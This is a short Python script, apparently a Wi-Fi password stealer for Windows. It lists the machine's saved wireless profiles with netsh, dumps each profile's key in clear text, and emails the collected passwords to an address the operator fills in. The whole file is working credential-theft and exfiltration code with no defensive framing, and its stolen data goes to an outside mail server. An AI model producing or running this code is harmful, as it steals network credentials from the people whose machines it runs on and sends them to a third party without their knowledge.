import smtplib, subprocess, re

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.google.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)
network_names_list = re.findall("(?:Profile\s*:\s)(.*)".encode(), networks)

result = ""
for network_name in network_names_list:
    command = "netsh wlan show profile " + str(network_name) + " key=clear"
    current_result = subprocess.check_output(command, shell=True)
    result = result + str(current_result)

# print(result)
send_mail("<write your email here>", "<write your password here>", result)